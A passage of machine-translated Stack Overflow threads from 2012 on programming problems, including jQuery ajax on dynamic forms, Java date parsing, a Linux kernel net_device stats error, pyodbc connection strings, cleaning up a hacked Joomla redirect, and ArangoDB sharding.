                '<input class ="submit-button" type="submit" id="submitButton" value="Get Trends" style="width:95px;" />');

       }
      }); 
```

此代码遵循上面的代码，当提交 from #mainform 时，我尝试向 php 脚本发出 XHR 请求。

```
$('#mainform').submit(function(){

            if(runProgram()){
                //Loading div. To be hidden upon sucessful ajax. Disable submit button
                document.getElementById("Loading").style.visibility="visible";
                document.getElementById("submitButton").disabled=true;

                $.ajax({
                     url: "indexProgram.php",
                     type: 'POST',
                     data: $(this).serialize(),

                     success:function(data, textStatus, jqXHR){
                        //take away loading div and reenable submit.
                        document.getElementById("Loading").style.visibility="hidden";
                        document.getElementById("submitButton").disabled=false;

                        var arr = data.split(",-,");

                        BeginTime = arr[3];

                        if(!(/^\s*$/).test(arr[0])) {

                        var lookAt = ge.createLookAt('');

                        data_array = arr[4].split("|");
                        alert(data);

                        // Set the position values.
                        lookAt.setLatitude(parseFloat(arr[0]));
                        lookAt.setLongitude(parseFloat(arr[1]));
                        //lookAt.setLatitude(43.653226);
                        //lookAt.setLongitude(-79.3831843);
                        lookAt.setTilt(50.0);
                        lookAt.setRange(9000.0); //default is 0.0

                        // Update the view in Google Earth.
                        ge.getView().setAbstractView(lookAt);
                        }
                        else{

                        alert("Location does not exist. Please try again with an existing Location")

                        }

                    },
                    complete : function(){

                        modDom(data_array);

                    }
                });

            }

            //doesn't refresh pag
            return false;
        });

      }); 
```

以前，当表单是静态的时，ajax xhr 调用成功完成，现在它没有。我一直在阅读问题可能是什么，以及表单如何不在 DOM 中，以及使用 .live，我已经尝试过，但它仍然不起作用。

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T09:12:56.580

您的问题是，首先加载您的文档，然后加载 jquery 代码。然后你创建一个动态创建的表单，jquery 不会发布。而是删除 $('document').ready() 并放置一个函数让我们假设 submit_form()。在您的表单的点击事件上调用此表单，您的表单将被提交。另一种方法是在动态创建表单元素时为它们分配一个类。在提交表单之前，使用此类循环以获取所有值并附加序列化表单以提交。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:49:00.587

您的答案在于 jquery 的 Live 事件处理程序的深处。

[http://docs.jquery.com/Events/live](http://docs.jquery.com/Events/live)

我真的不太记得了，但我认为它必须与 click 事件处理程序做一些事情，而不是绑定动态元素，但 Live 事件处理程序会这样做，所以尝试使用它。

**更新**

抱歉，似乎 Live() 事件处理程序在最新的 jQuery 中已被弃用。

> 从 jQuery 1.7 开始，不推荐使用 .live() 方法。使用 .on() 附加事件处理程序。旧版本 jQuery 的用户应该使用 .delegate() 而不是 .live()。

另一种方法是使用 jquery On() 事件处理程序。 [http://api.jquery.com/on/](http://api.jquery.com/on/)

**示例用法**

```
$("#dataTable tbody tr").on("click", function(event){
    alert($(this).text());
}); 
```

# java - 我面临 dateFormat.parse(string) 的问题？

> ID：10084959
> 
> 赞同：0
> 
> 时间：2012-04-10T07:42:42.647
> 
> 标签：java, date

我有以下代码片段

```
SimpleDateFormat dateFormat = new SimpleDateFormat(
      "yyyy-MM-dd hh:mm:ss.SSS");
 String processedContentDate="2012-04-10 12:53:28.033";   
 java.util.Date parsedDate = dateFormat.parse(processedContentDate);
java.sql.Timestamp timestamp = new java.sql.Timestamp(
 parsedDate.getTime()); 
```

我将日期解析为 Tue Apr 10 00:53:28 IST 2012 ，时间戳为 2012-04-10 00:53:28.033 。 **我想得到与 12:53:28.033 完全相同的时间（在我的原始字符串中）而不是 00:53:28.033。** 不明白为什么 12:53:28 被转换为 00:53:28。我应该怎么做才能得到 12:53:28？

**编辑：**得到响应后，我尝试了这个小程序，其中当前时间为 14:34:38.899，但在这两行，即第 1 行和第 2 行，我得到了低于解析日期 2012-04-10 14:34:38.899 根据回复我应该在第 1 行得到 02:34:38.899，因为日期格式是`yyyy-MM-dd hh:mm:ss.SSS")`

```
 java.util.Date date= new java.util.Date();
    String strDate=date.toString();
    java.util.Date parsedDate;
    java.util.Date parsedDate2;
     SimpleDateFormat dateFormat = new SimpleDateFormat(
     "yyyy-MM-dd hh:mm:ss.SSS");// line 1
     SimpleDateFormat dateFormat2 = new SimpleDateFormat(
     "yyyy-MM-dd HH:mm:ss.SSS");//line 2
     try {
         java.sql.Timestamp timestamp = new java.sql.Timestamp(date.getTime());
          strDate=timestamp.toString();

            parsedDate = dateFormat.parse(strDate);//line1
            parsedDate2 = dateFormat2.parse(strDate);//line2 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T07:48:34.957

`dateFormat`像这样定义你

```
DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS"); 
```

`HH`而不是`hh`. 请参见[SimpleDateFormat](http://docs.oracle.com/javase/1.4.2/docs/api/java/text/SimpleDateFormat.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:48:50.897

您的日期格式必须是`yyyy-MM-dd HH:mm:ss.SSS`.

`hh`是上午/下午`HH`的小时数，而是一天中的小时数（那是您错误的地方）。见[`SimpleDateFormat`](http://docs.oracle.com/javase/7/docs/api/java/text/SimpleDateFormat.html)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T09:33:37.787

根据[Date.toString()](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Date.html#toString%28%29)和[Timestamp.toString](http://docs.oracle.com/javase/1.5.0/docs/api/java/sql/Timestamp.html#toString%28%29)的定义，`.toString()`输出始终使用 24 小时制。如果要使用 AM/PM 显示时间，则应使用 dateformatter 打印日期。由于您使用相同的日期/时间作为两者的来源（`strDate`将使用 14:34），当您解析日期时，`SimpleDateFormat`使用 12 小时制时钟是“宽松的”，并允许将 14 解析为一个小时。

如果你设置

```
dateFormat.setLenient(false); 
```

你可能会发现`dateFormat.parse(strDate)`将会失败。

要打印日期，我永远不会依赖`toString`，但总是使用格式化程序。

```
System.out.println(dateFormat.format(parsedDate)); // should show ...02:36...
System.out.println(dateFormat2.format(parsedDate)); // should show ...14:36...
System.out.println(dateFormat.format(parsedDate2)); // should show ...02:36...
System.out.println(dateFormat2.format(parsedDate2)); // should show ...14:36... 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-06-10T06:39:58.990

试试下面的代码：

SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 日期 date = fmt.parse("yourdate"); SimpleDateFormat fmtOut = new SimpleDateFormat("dd-MM-yyyy hh:mm a");String myDate = fmtOut.format(date);

如果您的日期是 2016-06-10 12:06:43，那么输出将是 10-06-2016 12:06 pm。

# jquery - 检查jquery中ajax的响应是否为json

> ID：10084963
> 
> 赞同：0
> 
> 时间：2012-04-10T07:43:00.727
> 
> 标签：jquery

如何检查 jquery 中 ajax 的响应是否为 json？

有时响应会得到 json 格式，有时可能是一段 html 代码或整数。

如何检查给定的响应是 json 格式还是其他格式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:44:57.847

默认情况下，jQuery 是智能的并尝试检测格式。您可以使用各种方法来检测内容类型，最好的方法是查看响应的内容类型标头 - 但这仅在您的服务器端应用程序发送适当的标头时才有效。

但是，您确实应该尝试使所有响应的格式保持相同。为什么不简单地更改当前不返回 json 的任何内容以将文本包装在 JSON 中，例如`{"text": "yourtext"}`

# linux - 为什么我会收到“函数'ndo_get_stats'的隐式声明”错误？

> ID：10084964
> 
> 赞同：1
> 
> 时间：2012-04-10T07:43:06.983
> 
> 标签：linux, device-driver, kernel-module

我正在构建一个非常简单的内核模块，用于从网卡收集一些统计信息，这是代码，我不断收到错误消息`implicit declaration of function 'ndo_get_stats'`。我不确定为什么...

```
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/netdevice.h>    /* Needed for netdevice*/

static int __init hello_start(void)
{
    struct net_device *dev;

    printk(KERN_INFO "Loading Stats module...\n");
    printk(KERN_ALERT "Hello world\n");
    dev = first_net_device(&init_net);
    while (dev)
    {
         printk(KERN_INFO "found [%s] and it's [%d]\n", dev->name, dev->flags & IFF_UP);

         printk(KERN_INFO "End of dev struct ... now starts the get_stats struct\n");

     dev->stats = ndo_get_stats(dev);

     printk(KERN_INFO "recive errors: [%li]\n transmission errors: [%li]\n number of collisions: [%li]", dev->stats.rx_errors , dev->stats.tx_errors, dev->stats.collisions);

      dev = next_net_device(dev);
     }

    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_ALERT "Goodbye.\n");
}

module_init(hello_start);
module_exit(hello_end); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:47:32.627

`ndo_get_stats`是一个`net_device_ops`函数指针。`netdev_ops`你必须通过你的领域来调用它`net_device`。

像这样的东西会起作用：

```
stats = dev->netdev_ops->ndo_get_stats(dev); 
```

# c# - 对等通道文件传输

> ID：10084965
> 
> 赞同：0
> 
> 时间：2012-04-10T07:43:23.210
> 
> 标签：c#, p2p, peer

我有一个使用对等通道技术用 C# 编写的聊天程序，但我想扩展该程序以能够发送和接收文件对等

我怎样才能做到这一点？

我使用 DefaultCustomResolver.exe 和 instance.exe 。每个用户都打开 instance.exe

肿瘤坏死因子

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T08:33:52.763

公开一个将文件路径作为参数并将文件作为流返回的方法。请参阅[此处](http://www.codeproject.com/Articles/33825/WCF-TCP-based-File-Server)了解 wcf 中的文件服务器项目。虽然它不采用 p2p 方法，但我认为它会很有用。

# sql - Oracle的CURRENT_TIMESTAMP函数真的是函数吗？

> ID：10084967
> 
> 赞同：4
> 
> 时间：2012-04-10T07:43:31.197
> 
> 标签：sql, oracle, function, syntax

我的印象是，可以在函数名称后使用空括号调用无参数函数，即其他一些数据库允许这样做：

```
current_timestamp() 
```

而在 Oracle 中，我必须写

```
current_timestamp 
```

对于用户定义的函数，此规则不适用（在 11g 中）。我两个都可以写

```
my_function
my_function() 
```

**我的问题是：**真的[`CURRENT_TIMESTAMP`](http://docs.oracle.com/cd/E11882_01/server.112/e26088/functions045.htm#i999217)是一个真正的函数还是我应该将其视为 Oracle SQL 方言的语言构造/伪列（与 SQL 标准兼容）？关于何时可以（可选地，强制地）添加`()`以及何时必须省略它们，是否有任何正式定义？

背景信息：

*   [SQL 1992](http://www.contrib.andrew.cmu.edu/~shadow/sql/sql1992.txt)定义：

    ```
    <current timestamp value function> ::=
      CURRENT_TIMESTAMP [ <left paren> <timestamp precision> <right paren> ] 
    ```

*   Derby、HSQLDB、Ingres、Postgres、SQLite、SQL Server 的行为类似于 Oracle，其中不允许使用括号`CURRENT_TIMESTAMP`

*   Sybase SQL Anywhere 知道`CURRENT TIMESTAMP`函数（不带括号，不带下划线）
*   CUBRID、MySQL、Sybase ASE 允许使用`CURRENT_TIMESTAMP()`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T08:10:59.017

追溯到 1992 年的 SQL 标准将 CURRENT_TIMESTAMP 称为“时变系统变量”和“日期时间值函数”。例如，参见[数据库语言 SQL](http://www.contrib.andrew.cmu.edu/~shadow/sql/sql1992.txt)。

但是 AFAIK 标准总是使用 CURRENT_TIMESTAMP，而*不是*CURRENT_TIMESTAMP()。在兼容的 dbms 上使用 CURRENT_TIMESTAMP() 应该会失败并出现语法错误。

我不确定标准对用户定义的函数有什么看法。

# java - JavaScript 正则表达式在 Java 中不起作用

> ID：10084968
> 
> 赞同：0
> 
> 时间：2012-04-10T07:43:31.787
> 
> 标签：java, javascript, regex

```
"^(((\+44\s?\d{4}|\(?0\d{4}\)?)\s?\d{3}\s?\d{3})|((\+44\s?\d{3}|\(?0\d{3}\)?)\s?\d{3}\s?\d{4})|((\+44\s?\d{2}|\(?0\d{2}\)?)\s?\d{4}\s?\d{4})|((\+44\s?\d{4}|\(?0\d{4}\)?)\s?\d{5})|((\+44\s?\d{5}|\(?0\d{5}\)?)\s?\d{5})|((\+44\s?\d{5}|\(?0\d{5}\)?)\s?\d{4}))(\s?\#(\d{4}|\d{3}))?$"; 
```

我使用上述模式来验证英国电话号码。它在 JavaScript（客户端）中工作。但它不适用于 Java 代码（服务器端）。错误消息说`invalid escape sequence`。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-10T07:45:42.800

您需要将所有您的替换`\`为`\\` 话虽如此，您的正则表达式对于电话号码来说似乎有点复杂？我看到 GB (+44) 的国家代码包含了很多次，所以我想你只能说一次：

```
^(\+44)?(...) 
```

以及省略号所在的正则表达式的其余部分。

使这一点更清晰的另一个想法是将这个正则表达式分解为每种情况下的几个，例如：

```
if (matches case 1) return true; // example of case one
if (matches case 2) return true; // example of case two
if (matches case 3) return true; // example of case tree
...
return false; 
```

在我看来，这段代码维护起来会简单得多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:45:27.963

那是因为 Java 根本不接受`\`字符串（因为`\`未转义）。转而逃走`\`。`\\`

# python - 如何将配置变量值传递到 pyodbc connect 命令？

> ID：10084969
> 
> 赞同：11
> 
> 时间：2012-04-10T07:43:32.083
> 
> 标签：python, python-2.7, pyodbc, pythoncard

我有一个 .ini（配置文件），其中我提到了服务器名称、数据库名称、用户名和密码，我可以使用它们将我的应用程序连接到 MSSQL

```
self.db = pyodbc.connect(
    'driver={SQL Server};server=homeserver;database=testdb;uid=home;pwd=1234')` 
```

上面提到的connect语句对应的数据现在在config.ini中

```
self.configwrite = ConfigParser.RawConfigParser()
configread = SafeConfigParser()
configread.read('config.ini')

driver = configread.get('DataBase Settings','Driver')
server = str(configread.get('DataBase Settings','Server'))
db = str(configread.get('DataBase Settings','Database'))
user = str(configread.get('DataBase Settings','Username'))
password = str(configread.get('DataBase Settings','Password'))' 
```

如何在 pyodbc connect 语句中传递这些变量？

我试过这个：

```
self.db = pyodbc.connect('driver={Driver};server=server;database=db;uid=user;pwd=password') 
```

但我收到一个错误。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-10T12:17:45.130

[连接](https://github.com/mkleehammer/pyodbc/wiki/The-pyodbc-Module#connect)功能的其他选项：

```
# using keywords for SQL Server authentication
self.db = pyodbc.connect(driver=driver, server=server, database=db,
                         user=user, password=password)

# using keywords for Windows authentication
self.db = pyodbc.connect(driver=driver, server=server, database=db,
                         trusted_connection='yes') 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-10T08:07:37.923

```
self.db = pyodbc.connect('driver={%s};server=%s;database=%s;uid=%s;pwd=%s' % ( driver, server, db, user, password ) ) 
```

%s 用于将变量包含到字符串中

变量在 % 之后根据它们的顺序放入字符串中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-04-17T19:20:18.127

[使用 pyodbc 库在 sql 连接字符串中混合字符串和输入变量 - Python](https://stackoverflow.com/questions/57058650/mixing-strings-and-input-variable-in-sql-connection-string-using-pyodbc-library/57060627) 受此答案的启发

```
`conn=pyodbc.connect('Driver={SQL Server};'
                    'Server='+servername+';'
                    'Database=master;'
                    'UID=sa;'
                    'PWD='+pasword+';'
                    )` 
```

# android - 如何在 HTML 上显示 PDF 的表格

> ID：10084971
> 
> 赞同：0
> 
> 时间：2012-04-10T07:43:44.347
> 
> 标签：android, html, pdf, mobile

我们有并且要求我们必须转换 PDF 并将它们显示为移动设备上的 HTML 页面。我们使用了 PDf 到 HTML 转换器，但一些 PDF 包含表结构。转换器只是省略了表格结构并显示了内部内容。但我们需要 HTML 形式的整个表结构。我们尝试将其转换为图像，但图像变得模糊，因此无法从中读取。

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T12:02:48.737

PDF 是否实际上包含表格结构，或者在人眼查看时是否只是看起来像表格。如果它包含标记的内容，它将具有用于定义表的元数据。否则没有表数据

# security - 谷歌链接打开错误的页面

> ID：10084973
> 
> 赞同：0
> 
> 时间：2012-04-10T07:43:55.517
> 
> 标签：security, joomla

我们的网站最近被黑了（Joomla 1.5，托管在 VPS 上）。攻击者添加了一些重定向到某些广告网站的 php 脚本。我们已经清理了所有东西（或者至少我们认为我们已经清理了），现在一切正常。

然而，谷歌（或雅虎）上指向我们网站的链接仍在尝试包含这些 php 脚本（并返回 404，因为这些脚本现在已被删除）。来自浏览器的直接链接可以正常工作。

我们在 10 天前清理了网站，所以我认为 Google 服务器上没有缓存任何内容。现在应该完成重新索引。

要重现此行为：

*   访问 www.google.com
*   输入“anitex 袜子”
*   单击任何以“anitexsocks.com”开头的 php 链接
*   您将收到“在此服务器上找不到请求的 URL /wp-includes/client.php”+ 404 错误
*   刷新页面，一切正常

为什么只有谷歌链接会造成麻烦？欢迎任何帮助。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:57:52.293

至于发生这种情况的原因，我安装了一个 firefox 插件，它阻止了我的浏览器的 Referrer Header，然后按照 Google 链接指向您的网站，它运行良好。然后我禁用了插件，问题又开始出现了。

这表明您的网站上仍然运行着一些恶意代码，它正在检查所有 http 请求以查看它们是否来自 Google（基于检查 HTTP Referrer 标头），如果有，则将它们重定向到 /wp-includes/client.php ,

要尝试确定此代码可能存在的位置，请尝试通过您服务器上的所有 www 文件以及 www 配置文件执行递归 grep，那里的某处必须仍然有对该 client.php 脚本的引用，希望您可以找到并消除它。

也就是说，如果它是我的网站，并且我知道黑客可以自由支配我的服务器并为所欲为，我不会试图消除损坏，而是会恢复之前的最新备份。网站被黑了。您只需错过黑客留下的一个后门，他们就可以重新进入您的网站。恢复备份后，您还应该首先升级/重新配置他们用来获得访问权限的软件，这样他们就不能再次以相同的方式重新破解它。

# javascript - 从缩小的 JavaScript 文件中获取错误的行号

> ID：10084975
> 
> 赞同：1
> 
> 时间：2012-04-10T07:44:30.553
> 
> 标签：javascript

当 JavaScript 文件被缩小时，是否可以以任何方式动态获取错误的行号？

目前，所有错误都记录为发生在第 0 行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:45:33.173

不，这就是为什么您不应该在开发/调试期间使用缩小代码的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T08:42:52.230

您可以美化缩小的代码。在 chrome 检查器中，它是`{}`按钮，被称为“漂亮打印”。

但是，美化这段代码并不意味着它会尊重你的原始代码。

因此，我会说[ThiefMaster](https://stackoverflow.com/a/10084997/851498)所说的：在开发/调试期间不要使用缩小的代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T10:23:19.623

您想要调试缩小脚本的一个原因是，如果您使用闭包编译器对其进行优化，并且优化过程会导致错误。对于在堆栈跟踪中提供列 (Chrome,IE) 的浏览器，您可以执行以下操作：

```
/*@const*/ //for closure-compiler
DEBUG=2 // 0=off, 1=msg:file:line:column, 2=msg:stack-trace
if(DEBUG){

/*@const @constructor*/
Object.defineProperty(window,'__stack__',{get:function(){
    try{_ფ_()}catch(e){return e.stack.split(":")}
}})

/*@const @constructor*/
Object.defineProperty(window,'__file__',{get:function(){
    var s=__stack__,l=s.length
    return (isNaN(s[l-2]))?s[l-2]:s[l-3]
}})

/*@const @constructor*/
Object.defineProperty(window,'__line__',{get:function(){
    var s=__stack__,l=s.length
    return (isNaN(s[l-2]))?s[l-1]:s[l-2]
}})

/*@const @constructor*/
Object.defineProperty(window,'__col__',{get:function(){
    var s=__stack__,l=s.length
    return (isNaN(s[l-2]))?"NA":s[l-1]
}})

/*@const @constructor*/
Object.defineProperty(window,'LOG',{
    get:function(){return out},
    set:function(msg){if(DEBUG>1)out=msg+"\t-\t"+__stack__
        else out=msg+" in file:"+__file__+" @ Line:"+__line__+", Column:"+__col__
        console.log(out)}
})
}//end if(DEBUG) 
```

用法：`LOG="my message"`将“我的消息”连同行号和文件写入控制台或获取最后的日志`alert(LOG)`

您可以使用 v8（chrome、node.js）更深入地了解杂草

```
/*@const @constructor*/ Object.defineProperty(this,'__stack',{get:function(){var o=Error['prepareStackTrace'],e=new Error,s;Error['prepareStackTrace']=function(_,s){return s},Error['captureStackTrace'](e,arguments['callee']),s=e['stack'],Error['prepareStackTrace']=o;return s}})

/*@const @constructor*/ Object.defineProperty(this,'__col__',{get:function(){return __stack[1]['getColumnNumber']()}})
/*@const @constructor*/ Object.defineProperty(this,'__eval_orig__',{get:function(){return __stack[1]['getEvalOrigin']()}})
/*@const @constructor*/ Object.defineProperty(this,'__file__',{get:function(){return __stack[1]['getFileName']()}})
/*@const @constructor*/ Object.defineProperty(this,'__func__',{get:function(){return __stack[1]['getFunctionName']()}})
/*@const @constructor*/ Object.defineProperty(this,'__function__',{get:function(){return __stack[1]['getFunction']()}})
/*@const @constructor*/ Object.defineProperty(this,'__is_constructor__',{get:function(){return __stack[1]['isConstructor']()}})
/*@const @constructor*/ Object.defineProperty(this,'__is_eval__',{get:function(){return __stack[1]['isEval']()}})
/*@const @constructor*/ Object.defineProperty(this,'__is_native__',{get:function(){return __stack[1]['isNative']()}})
/*@const @constructor*/ Object.defineProperty(this,'__is_top_level__',{get:function(){return __stack[1]['isTopLevel']()}})
/*@const @constructor*/ Object.defineProperty(this,'__line__',{get:function(){return __stack[1]['getLineNumber']()}})
/*@const @constructor*/ Object.defineProperty(this,'__method__',{get:function(){return __stack[1]['getMethodName']()}})
/*@const @constructor*/ Object.defineProperty(this,'__this__',{get:function(){return __stack[1]['getThis']()}})
/*@const @constructor*/ Object.defineProperty(this,'__type__',{get:function(){return __stack[1]['getTypeName']()}}) 
```

# cocoa-touch - 我可以在 iPad 上显示“小”320x50 iAd 横幅吗？

> ID：10084984
> 
> 赞同：2
> 
> 时间：2012-04-10T07:44:48.760
> 
> 标签：cocoa-touch, ipad, iad

由于在我的国家/地区，iPad 的 iAd 横幅很少（如果有的话），我更愿意为 iPhone 展示这些横幅。我知道它们很小并且没有针对 iPad 进行优化，但至少它们让我可以通过我的应用程序的 iPad 版本获利。

的`requiredContentSizeIdentifiers`属性`ADBannerView`接受这些值：

```
extern NSString * const ADBannerContentSizeIdentifier320x50;
extern NSString * const ADBannerContentSizeIdentifier480x32;
extern NSString * const ADBannerContentSizeIdentifierPortrait;
extern NSString * const ADBannerContentSizeIdentifierLandscape; 
```

但前两个 (`ADBannerContentSizeIdentifier320x50`和`ADBannerContentSizeIdentifier480x32`) 已弃用。

如果在 iPad 上我将`ADBannerContentSizeIdentifierPortrait`横幅尺寸设置为 768x66。

是否可以在 iPad 上显示“小”320x50 iAd 横幅？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:53:52.890

我不认为你可以，但我几天前正在阅读这篇文章：

[http://www.hung-truong.com/blog/2011/02/07/iad-vs-admob-clicks-fill-rate-impressions-ecpm-and-revenue/](http://www.hung-truong.com/blog/2011/02/07/iad-vs-admob-clicks-fill-rate-impressions-ecpm-and-revenue/)

基本上让你的应用程序“注册”到两个广告流，这样几乎总会有一些东西显示出来。

我没有尝试过自己，因为我的填充率很幸运，但我希望它有所帮助！

# nosql - ArangoDB 可以像 MongoDB 或 CouchDB 一样扩展吗

> ID：10084990
> 
> 赞同：3
> 
> 时间：2012-04-10T07:45:03.533
> 
> 标签：nosql, arangodb

我正在阅读有关 ArangoDB 的内容，它更有趣，但我在文档中找不到 ArangoDB 如何扩展的位置。ArangoDB 是否可扩展，是否可以使用 MongoDB 或 CouchDB 之类的分片？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-17T12:55:10.977

**编辑**

> ArangoDB 从 2.0 版开始支持分片。
> 
> 3.0 版将带来[VelocyPack](https://github.com/arangodb/velocypack/)，它是一种二进制 JSON 表示，针对紧凑性、可解析性和可组合性进行了优化。它取代了形状概念/形状 JSON。

**/编辑**

* * *

我是 ArangoDB 的首席架构师。

​monkegjinni 是对的，ArangoDB 不支持分片，但支持复制。为什么？

# 短版：

为相当复杂的数据模型（如图形和文档）提供支持会与分片的工作方式发生冲突。然而，随着现代 SSD 和计算机的效率，我们相信几乎所有项目都不再需要分片。今天的计算机可以轻松地将所有数据存储在单个节点上。这些项目需要的是 ArangoDB 支持的负载分配复制。

# 长版：

实际上有单独的缩放问题。

第一个问题是将请求分发到多个服务器以平衡请求负载。

ArangoDB 将通过写入的同步复制和读取请求的分发来支持这一点。

请注意，大多数数据库系统都遵循非常相似的路径，即它们支持通过有限的一致性保证分发请求，或者它们只允许在一个节点上写入并分发读取请求。他们有这个限制，因为分发写请求和支持完全一致性是不可能有效的。效率低下会抵消我们希望通过分发实现的收益。

第二个问题是将数据分布在多个服务器上以允许更大的数据集。

ArangoDB 不支持将数据分布在多个服务器上。

我们做出了这个决定，因为在多台服务器上分发数据总是要付出代价的。

这个价格可以非常明确。例如，数据模型可能非常有限。这是 Dynamo 或 RIAK 等键值存储所采用的路线。这里的数据模型和支持的查询非常简单，因此始终可以将查询定向到请求值所在的服务器（或少数服务器）。

请注意，我们确实相信这种方法对某些应用程序（例如 Amazons 数据库）有效。但我们认为，真正需要存储大量数据以致必须将其分布在大量服务器上并因此必须将访问模式限制为键值对的应用程序数量非常少。

​或者可以隐藏价格。例如，如果数据是分布式的，并且数据库系统允许一般查询，就会出现这种情况。在这种情况下，查询必须分布在所有服务器上（因为您要查找的数据可能存在于任何服务器上）。这使得查询效率低下。

​ArangoDB 的方法是将最多的东西挤到一台服务器上（好吧，ArangoDB 支持多台服务器 - 但要支持可用性）。为此，它使用两种主要策略。

一种策略是利用 SSD。请注意，SSD 的容量正以惊人的速度增长（您可以购买 TB 的 SSD，而购买第二台服务器的成本要少得多）。耐用性（可以写入 SSD 的数据总量）高达 PB（现在供应商终于获得了正确的磨损均衡算法）——因此 SSD 的可靠性不再是问题。并且这些 SSD 的性能非常好（比普通磁盘更接近主存）。

​另一种策略是有效地存储数据。ArangoDB 使用形状来存储文档：形状是文档具有哪些属性和属性类型的信息 - 所有具有相同形状的文档共享此信息的表示。这意味着文档可以存储在比 JSON 或 BSON 表示所需的更少的空间中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:33:55.983

据我了解，它不允许分片^(（2.0 版之前）)，但允许复制。从[链接](http://www.avocadodb.org/2012/03/07/7-reasons-why-avocadodb-is-the-worlds-best-nosql-database-or-even-better-than-that)

> AvocadoDB 毫不费力地允许复制。我们喜欢“零管理原则”。使用 AvocadoDB 进行复制非常简单：插入 IP 地址即可！
> 
> 以下复制类型适用于版本 2：
> 
> *   主主同步，
> *   主主异步，
> *   主从同步，
> *   主从异步